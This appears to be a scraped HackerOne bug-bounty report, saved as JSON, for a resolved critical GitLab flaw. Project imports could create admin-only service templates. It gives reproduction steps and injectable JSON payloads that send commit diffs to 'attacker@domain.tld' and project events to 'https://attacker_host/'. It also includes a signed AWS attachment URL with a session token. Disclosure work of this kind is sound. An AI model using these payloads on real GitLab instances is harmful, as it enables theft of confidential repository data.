@@ -1,0 +1,215 @@
+{
+  "id": 446585,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDY1ODU=",
+  "url": "https://hackerone.com/reports/446585",
+  "title": "Exfiltrate and mutate repository and project data through injected templated service",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-11-18T03:13:40.062Z",
+  "submitted_at": "2018-11-18T03:13:40.062Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-03-05T00:09:55.389Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-12-11T04:27:31.541Z",
+  "team_member_agreed_on_going_public_at": "2019-03-05T00:09:55.300Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The GitLab import feature contains a vulnerability that allows an attacker to import a project that creates a service template. Service templates can normally only be created by a GitLab instance Administrator. When a new project is created, service templates are automatically initialized for the project that is being created. Initializing and saving the service templates is handled in the `Projects::CreateService` class:\n\n**app/services/projects/create_service.rb**\n```ruby\n# ...\ndef create_services_from_active_templates(project)\n  Service.where(template: true, active: true).each do |template|\n    service = Service.build_from_template(project.id, template)\n    service.save!\n  end\nend\n# ...\n```\n\nThis means that when an attacker has created a templated service that is valid, any project created after that, will automatically install the attacker's service for that project. There are multiple attacks possible with this, which will be described in the Impact section of this report. Depending on the strategy the attacker takes, it may impact Confidentiality, Integrity, as well as Availability.\n\n# Proof of concept\nAttached you can find a tar file that injects a `MockCiService` as template to the GitLab instance: F377180. In order to manually reproduce this, follow the steps below.\n\n1. Sign in as any user\n1. Create a new project\n1. Enable the CI service through Settings > Integrations\n1. Export the project and download the export file\n1. Extract the files, it'll contain a `project.json` file\n1. Replace `\"template\":false` in the `services` array with `\"template\":true`\n1. Replace `CiService` in the `services` array with `MockCiService`\n1. Create a new tar file (`tar -zcvf service_template.tar.gz project.json VERSION project.bundle`)\n1. Upload the tar file\n1. Sign in as another user\n1. Create another project\n1. Immediately export the project and download the export file\n1. Extract the files\n1. Observe that the `project.json` file will contain the service created for the other project\n\n# Additional, seemingly, less severe issues\nWhen looking into this feature, it was also observed that an attacker can create custom attributes for a project. I noticed that custom project attributes can only be created by an instance Administrator. However, by specifying custom attributes in the `custom_attributes` array, a user can create custom project attributes for the project that is being created. Depending on how the custom attributes are used on the instance, this may have additional consequences.\n\n## Impact\n\nAn attacker can decide on what strategy to take with this vulnerability. The most interesting ones that I could find are described below.\n\n**Exfiltrating repository event**\nThe `EmailsOnPushService` has the option to include a commit diff in an email. When the JSON below is added to the `project.json` file, any commit's diff will be emailed to the attacker.\n\n```json\n{\n  \"id\": 41858507,\n  \"title\": \"Email\",\n  \"project_id\": 9465078,\n  \"created_at\": \"2018-11-18T01:22:06.990Z\",\n  \"updated_at\": \"2018-11-18T01:22:06.990Z\",\n  \"active\": true,\n  \"properties\": {\n    \"send_from_committer_email\": false,\n    \"disable_diffs\": false,\n    \"recipients\": \"attacker@domain.tld\"\n  },\n  \"template\": true,\n  \"push_events\": true,\n  \"issues_events\": true,\n  \"merge_requests_events\": true,\n  \"tag_push_events\": true,\n  \"note_events\": true,\n  \"category\": \"ci\",\n  \"default\": false,\n  \"wiki_page_events\": true,\n  \"pipeline_events\": true,\n  \"confidential_issues_events\": true,\n  \"commit_events\": true,\n  \"job_events\": true,\n  \"confidential_note_events\": true,\n  \"type\": \"EmailsOnPushService\"\n}\n```\n\n**Exfiltrating (confidential) issues, merge requests, pipelines, etc.**\nThe HipChat service, similar to Slack, is a service that responds to all events a project can trigger. Creating a template for this service will automatically send all new issues, notes, merge requests, pipeline updates, and pushes to a HipChat server. Below is the JSON object to inject a HipChat service template.\n\n```json\n{\n  \"id\": 41858507,\n  \"title\": \"HipChat\",\n  \"project_id\": 9465078,\n  \"created_at\": \"2018-11-18T01:22:06.990Z\",\n  \"updated_at\": \"2018-11-18T01:22:06.990Z\",\n  \"active\": true,\n  \"properties\": {\n    \"token\": \"some_token\",\n    \"room\": \"room\",\n    \"server\": \"\",\n    \"color\": \"red\",\n    \"api_version\": \"\"\n  },\n  \"template\": true,\n  \"push_events\": true,\n  \"issues_events\": true,\n  \"merge_requests_events\": true,\n  \"tag_push_events\": true,\n  \"note_events\": true,\n  \"category\": \"common\",\n  \"default\": false,\n  \"wiki_page_events\": true,\n  \"pipeline_events\": true,\n  \"confidential_issues_events\": true,\n  \"commit_events\": true,\n  \"job_events\": true,\n  \"confidential_note_events\": true,\n  \"type\": \"HipchatService\"\n}\n```\n\n**Hidden services**\nAn attacker can leverage the `MockCiService` to inject a service that is not visible in the UI. The only mock service that interacts with an actual service is the `MockCiService`. The other two, `MockDeploymentService` and `MockMonitoringService`, do not interact with an external URL.\n\n```json\n{\n  \"id\": 41858507,\n  \"title\": \"MockCI\",\n  \"project_id\": 9465078,\n  \"created_at\": \"2018-11-18T01:22:06.990Z\",\n  \"updated_at\": \"2018-11-18T01:22:06.990Z\",\n  \"active\": true,\n  \"properties\": {\n    \"mock_service_url\": \"https://attacker_host/\",\n    \"multiproject_enabled\": \"1\",\n    \"pass_unstable\": \"0\"\n  },\n  \"template\": true,\n  \"push_events\": true,\n  \"issues_events\": true,\n  \"merge_requests_events\": true,\n  \"tag_push_events\": true,\n  \"note_events\": true,\n  \"category\": \"ci\",\n  \"default\": false,\n  \"wiki_page_events\": true,\n  \"pipeline_events\": true,\n  \"confidential_issues_events\": true,\n  \"commit_events\": true,\n  \"job_events\": true,\n  \"confidential_note_events\": true,\n  \"type\": \"MockCiService\"\n}\n```\n\nUnconfirmed: **Mutating data**\nThe Slack service / integration allows a user to also interact with objects in a project. Because an attacker can force a weak token in the service template, it can then send an API request to the GitLab API to interact with the project. This could not be confirmed because I did not feel comfortable creating a Slack template on gitlab.com and I was not able to set up the Slack integration on my own GitLab instance. However, I was able to confirm that I was able to create this service on my own GitLab instance with a weak token (`a`). JSON below.\n\n```json\n{\n  \"id\": 41858507,\n  \"title\": \"Slack\",\n  \"project_id\": 9465078,\n  \"created_at\": \"2018-11-18T01:22:06.990Z\",\n  \"updated_at\": \"2018-11-18T01:22:06.990Z\",\n  \"active\": true,\n  \"properties\": {\n    \"token\": \"a\"\n  },\n  \"template\": true,\n  \"push_events\": true,\n  \"issues_events\": true,\n  \"merge_requests_events\": true,\n  \"tag_push_events\": true,\n  \"note_events\": true,\n  \"category\": \"common\",\n  \"default\": false,\n  \"wiki_page_events\": true,\n  \"pipeline_events\": true,\n  \"confidential_issues_events\": true,\n  \"commit_events\": true,\n  \"job_events\": true,\n  \"confidential_note_events\": true,\n  \"type\": \"SlackSlashCommandsService\"\n}\n```\n\n**External services**\nThe two other services that had an interesting side effect were the `ExternalWikiService` and `CustomIssueTrackerService`. Both of them can be used to overwrite a project's Issue and Wiki URL in their project. This may be used to social engineer users into creating issues on a domain that is controlled by the attacker.",
+  "bounty_amount": "11000.0",
+  "formatted_bounty": "$11,000",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 377180,
+      "file_name": "service_template.tar.gz",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/377/180/a732125b2044234a1a5a2d4e71ff5803e3bcda1a/service_template.tar.gz?response-content-disposition=attachment%3B%20filename%3D%22service_template.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27service_template.tar.gz&response-content-type=application%2Fgzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ67G6VXDE%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T053651Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCFAqAd0hBTXrbZIIzOrNA8GMvM0aOjeq4AUgMtTauzewIgEhx8cr0fiskT%2FyowIyR0msUz1EI7lh%2B1SbIFaXTJdUQqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDJ98pIawrVFB0%2FVgvSqPBRpflQm5buRGV6W0zw%2Bh7tZccFjTLUchaN2QewFnZ8k%2BPWwZCR7Uit6%2BSphhJ5T1FKD8k7sUPCjfAupObtxcUROEd9HgI9uk4iucbvhXETm3Zk9GmC5wZqE2xlkHqFKwQU8xIZmyDRzaGvz5LWcFSxbVBSQEPMn8n%2FSQGWFvO0dn1c%2FXVMZTzJqspZ4st%2Bc7UcwixUVV3ddIDVlh1VtWbnkUO3bWfnh54zeNypCHQ2MVCVFkeuqIkJNc77nikuuIUj7%2B2pDQsli3I3gvMWGQCqHIca5AMnmokyrJ5eKqd3DOBjn0tIMTKtZ7tVG1%2F6d6rzxXRyHmma7GIKgMnmVyVPrDswiP%2BJK245AYdiH2MJ5suO6SQbAoWyIFIwoBYkswS2snHT2VWqaSk48R2GNPlkvD3IbPmp1xujZ2AptcxfAsU2nn%2BX%2F2QhYbW0vySRJVa4%2BTB4sBQA166EZrjt41fCy0BIZbl%2FplT%2Bq%2Fuxxzs9%2BCnOb9%2FxEhL7nBe8a0pt4Dgkt9LOw7lBoZlgGwXEg9P%2B8JT640b5hyzFTcpwwZTfFZEBjHUiskDOdssCJyMaMpfogHEnAKdwLCORjBbdsXo4Ee%2BeF8EtMyZRRzkwTiHddlDQPCFU8Qfp0Yw2bT%2Fn6qfxXg92DpRjAy84CiOS%2Bj5vn8IgxH2W8FcbOh%2BI49HVw3wl%2FuclESUXiSFxjcgeZIYb9bIHSTn3e4x66g06O0m1cf2iVY8hJCRGns5bngjLPenbSLMNjaguMXy%2Ft1KPpG4Iyt1QV1Q%2F9m57dF6nTo1jZ%2FAXnaZkiwjL8%2BtpvLhP1pjyv0iyk4EqiFOX5qwX6gZdovLVPRq%2B7HlvvkKhMUD1HBg%2FHWswQHEg9stLTaEh8wq7S30gY6sQHgw4vYPGwH65EwNsG1ddciYNRwKnJUMcAHXx8e2eIyHCrC4goyQjE35uH%2FXpZI5UVITWOiCN93lRIzJ4Cl7ykwhzx8ttiORcXFbUILgnXIQ0BEizu7mpLzZnZDAz8LGtNhpgtQ8QcJ2ltEw3Qr6WR75fM9QZf8u71%2BlCRUpMFUPk2aewOEhgQHzuW2by6A7gWbS9iEEKil8OxTZvqp41215NLFLYjQwTfe1x4zxsBLexc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ee1e3a1cf73ca8389b16e10f0911360c6055285a9bc4f4bbc4dc470eb0f8f155",
+      "file_size": 1915,
+      "type": "application/gzip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-01-10T04:27:31.597Z",
+  "allow_singular_disclosure_after": -236394559.86152223,
+  "singular_disclosure_allowed": true,
+  "vote_count": 758,
+  "voters": [
+    "herikane",
+    "mirchr",
+    "notpwnguy",
+    "sky003",
+    "dobispr",
+    "k10kten",
+    "rioru",
+    "taha",
+    "orange303",
+    "barbie_girl",
+    "and 748 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "low"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "446585",
+  "votes": 758,
+  "latest_disclosable_activity_at": "2019-03-05T00:09:55.408Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:36:51.695279",
+    "source": "https://hackerone.com/reports/446585.json",
+    "report_id": 446585
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDY1ODU=",
+    "databaseId": "446585",
+    "title": "Exfiltrate and mutate repository and project data through injected templated service",
+    "url": "https://hackerone.com/reports/446585",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2019-03-05T00:09:55.389Z",
+    "created_at": "2018-11-18T03:13:40.062Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzI2",
+      "name": "Improper Access Control - Generic",
+      "external_id": "cwe-284"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": 9.9
+    },
+    "reporter": {
+      "username": "jobert"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xMTA2MTA=",
+            "amount": "11000.00",
+            "awarded_amount": "11000.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2018-11-20T14:32:40.930Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzQ0NjU4NQ==",
+    "_id": "446585",
+    "disclosed": true,
+    "votes": 758,
+    "latest_disclosable_activity_at": "2019-03-05T00:09:55.408Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDY1ODU=",
+      "databaseId": "446585",
+      "title": "Exfiltrate and mutate repository and project data through injected templated service",
+      "url": "https://hackerone.com/reports/446585",
+      "disclosed_at": "2019-03-05T00:09:55.389Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    }
+  }
+}
